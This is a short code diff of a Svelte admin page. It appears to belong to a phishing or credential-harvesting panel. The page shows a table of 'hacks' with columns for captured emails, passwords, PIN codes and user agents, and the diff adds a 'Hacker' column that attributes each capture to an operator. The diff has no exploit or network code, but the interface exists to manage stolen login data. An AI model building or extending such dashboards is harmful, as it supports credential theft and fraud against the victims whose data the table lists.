@@ -6,7 +6,7 @@
     import { getAllUsers, getUser } from "$lib/users";
     import UserListItem from "$lib/components/UserListItem.svelte";
 
-    let usersList = [];
+  
 
     let activeItem = "hacks";
 
@@ -14,9 +14,7 @@
         activeItem = text;
     }
 
-    onMount(() => {
-        getAllUsers().then((u) => (usersList = u));
-    });
+
 </script>
 
 <div style="padding: 8px;">
@@ -39,16 +37,17 @@
     <div class="center">
         <table>
             <tr style="border:1px solid blue;">
-                <th>time</th>
-                <th>email</th>
-                <th>password</th>
-                <th>pin-code</th>
-                <th>userAgent</th>
-                <th>actions</th>
+                <th>Time</th>
+                <th>Hacker</th>
+                <th>Email</th>
+                <th>Password</th>
+                <th>Pin-code</th>
+                <th>UserAgent</th>
+                <th>Actions</th>
             </tr>
 
             {#each $allHacksList as hack}
-                <HackData {hack} admin="true" />
+                <HackData {hack} admin="true" isShowHacker={true}/>
             {/each}
         </table>
     </div>
@@ -62,7 +61,7 @@
 {/if}
 {#if activeItem === "users"}
     <div style="display: flex; justify-content: center; padding-top: 20px; ">
-        <UserListItem {usersList} />
+        <UserListItem />
     </div>
 {/if}
 
